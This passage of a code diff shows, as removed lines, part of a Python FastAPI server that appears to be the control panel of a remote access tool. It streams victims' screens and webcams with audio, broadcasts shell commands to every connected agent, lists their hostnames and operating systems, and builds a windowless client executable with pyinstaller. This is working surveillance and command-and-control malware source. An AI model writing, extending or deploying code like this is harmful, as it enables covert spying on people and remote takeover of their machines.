-    finally:
-        logger.info(f"❌ Camera stream disconnected: {device_id[:8] if device_id else '?'}...")
-        if device_id and device_id in state.clients:
-            if state.clients[device_id].camera_ws is websocket:
-                state.clients[device_id].camera_ws = None
-
-
-@app.websocket("/ws/viewer/{device_id}")
-async def ws_viewer(websocket: WebSocket, device_id: str):
-    await websocket.accept()
-    if device_id not in state.clients:
-        await websocket.close()
-        return
-    session = state.clients[device_id]
-    session.viewers.add(websocket)
-    logger.info(f"👁 Viewer attached to {device_id[:8]}...")
-    try:
-        while True:
-            raw = await websocket.receive()
-            parsed = _ws_payload(raw)
-            if parsed is None:
-                break
-            kind, payload = parsed
-            if kind == "skip":
-                continue
-            if device_id not in state.clients:
-                break
-            try:
-                if kind == "bytes":
-                    await session.agent_send_bytes(payload)
-                elif kind == "text":
-                    await session.agent_send_text(payload)
-            except Exception:
-                break
-    except WebSocketDisconnect:
-        pass
-    finally:
-        session.viewers.discard(websocket)
-
-
-@app.websocket("/ws/viewer_cam/{device_id}")
-async def ws_viewer_cam(websocket: WebSocket, device_id: str):
-    await websocket.accept()
-    if device_id not in state.clients:
-        await websocket.close()
-        return
-    session = state.clients[device_id]
-    session.cam_viewers.add(websocket)
-    logger.info(f"👁 Webcam viewer attached to {device_id[:8]}...")
-    try:
-        if session.ws:
-            try:
-                await session.agent_send_text(json.dumps({"cmd": CMD_VIEW, "args": {"substream": "cam", "enabled": True, "audio": True}}))
-            except Exception:
-                pass
-        while True:
-            raw = await websocket.receive()
-            parsed = _ws_payload(raw)
-            if parsed is None:
-                break
-            if device_id not in state.clients:
-                break
-            kind, payload = parsed
-            if kind == "skip":
-                continue
-            try:
-                if kind == "bytes":
-                    await session.agent_send_bytes(payload)
-                elif kind == "text":
-                    await session.agent_send_text(payload)
-            except Exception:
-                break
-    except WebSocketDisconnect:
-        pass
-    finally:
-        session.cam_viewers.discard(websocket)
-        if not session.cam_viewers and session.ws:
-            try:
-                await session.agent_send_text(json.dumps({"cmd": CMD_VIEW, "args": {"substream": "cam", "enabled": False}}))
-            except Exception:
-                pass
-
-
-@app.get("/")
-async def root():
-    try:
-        with open("dashboard_working.html", "r", encoding="utf-8") as f:
-            return HTMLResponse(content=f.read(), headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"})
-    except FileNotFoundError:
-        return HTMLResponse(content=DASHBOARD, headers={"Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Expires": "0"})
-
-
-@app.get("/clients")
-async def get_clients():
-    out = {cid: s.info for cid, s in state.clients.items()}
-    logger.info(f"/clients returning {len(out)} entries: {list(out.keys())}")
-    return out
-
-
-@app.post("/broadcast")
-async def broadcast_command(request: Request):
-    """Send a shell command to all (or selected) agents. Body: {cmd: "...", targets: ["id1"]|"*", shellId: "broadcast"}"""
-    body = await request.json()
-    command = body.get("cmd", "")
-    targets = body.get("targets", "*")
-    shell_id = body.get("shellId", "broadcast")
-    if not command:
-        return JSONResponse({"status": "error", "msg": "No command"}, status_code=400)
-
-    _broadcast_results.clear()
-    payload = json.dumps({"cmd": 0x0F, "args": {"cmd": command, "shellId": shell_id}})
-    sent = 0
-    if targets == "*":
-        targets = list(state.clients.keys())
-    for cid in targets:
-        session = state.clients.get(cid)
-        if session:
-            try:
-                await session.agent_send_text(payload)
-                sent += 1
-            except Exception:
-                pass
-    return JSONResponse({"status": "ok", "sent": sent, "total": len(targets)})
-
-
-@app.get("/broadcast_results")
-async def get_broadcast_results():
-    return _broadcast_results
-
-
-@app.get("/stats")
-async def get_stats():
-    clients = state.clients
-    total_viewers = sum(len(s.viewers) + len(s.cam_viewers) for s in clients.values())
-    return {
-        "active_clients": len(clients),
-        "total_viewers": total_viewers,
-        "uptime": time.time() - _start_time if '_start_time' in dir() else 0,
-        "clients": {
-            cid: {
-                "hostname": s.info.get("hostname", "?"),
-                "os": s.info.get("os", "?")[:40],
-                "connected_for": int(time.time() - s.created),
-                "viewers": len(s.viewers),
-                "cam_viewers": len(s.cam_viewers),
-            }
-            for cid, s in clients.items()
-        },
-    }
-
-
-def _load_network_config():
-    cfg_path = os.path.join(os.getcwd(), "network_config.json")
-    if os.path.exists(cfg_path):
-        try:
-            with open(cfg_path, "r", encoding="utf-8") as f:
-                return json.load(f)
-        except:
-            pass
-    return {
-        "server_bind_host": os.environ.get("HOST", "127.0.0.1"),
-        "server_port": int(os.environ.get("PORT", "8080")),
-        "client_target_host": "127.0.0.1",
-        "client_target_port": 8080
-    }
-
-
-def _save_network_config(data):
-    cfg_path = os.path.join(os.getcwd(), "network_config.json")
-    with open(cfg_path, "w", encoding="utf-8") as f:
-        json.dump(data, f, indent=2)
-
-
-@app.get("/network_config")
-async def get_network_config():
-    return _load_network_config()
-
-
-@app.post("/network_config")
-async def post_network_config(request: Request):
-    data = await request.json()
-    try:
-        _save_network_config(data)
-        return JSONResponse({"status": "ok"})
-    except Exception as e:
-        return JSONResponse({"status": "error", "message": str(e)}, status_code=500)
-
-
-@app.post("/build_client")
-async def build_client():
-    pyinstaller = shutil.which("pyinstaller")
-    if not pyinstaller:
-        return JSONResponse({"status": "error", "message": "pyinstaller not found"}, status_code=500)
-    try:
-        proc = subprocess.run([pyinstaller, "--onefile", "--noconsole", "client.py"], capture_output=True, text=True, timeout=300)
-        out = proc.stdout + "\n" + proc.stderr
-        return PlainTextResponse(out)
-    except Exception as e:
-        return PlainTextResponse(str(e), status_code=500)
-
-
-@app.get("/test")
-async def test():
-    return JSONResponse({"status": "ok", "clients": {cid: s.info for cid, s in state.clients.items()}})
-
-
-@app.get("/server_logs")
-async def server_logs(lines: int = 100):
-    try:
-        with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
-            return PlainTextResponse("".join(deque(f, maxlen=lines)))
-    except FileNotFoundError:
-        return PlainTextResponse("Server log file not found.")
-    except Exception as e:
-        return PlainTextResponse(f"Error reading server logs: {e}")
-
-
-if __name__ == "__main__":
-    if len(sys.argv) > 1 and sys.argv[1] in ("--gui", "-g", "--dashboard-gui"):
-        from dashboard_host import main as _dashboard_main
-
-        raise SystemExit(_dashboard_main(sys.argv[2:]) or 0)
-    host = os.environ.get("HOST", "0.0.0.0")
-    port = int(os.environ.get("PORT", "80"))
-    uvicorn.run(
-        app,
-        host=host,
-        port=port,
-        backlog=2048,
-        ws_ping_interval=60,
-        ws_ping_timeout=120,
-        timeout_keep_alive=120,
-    )
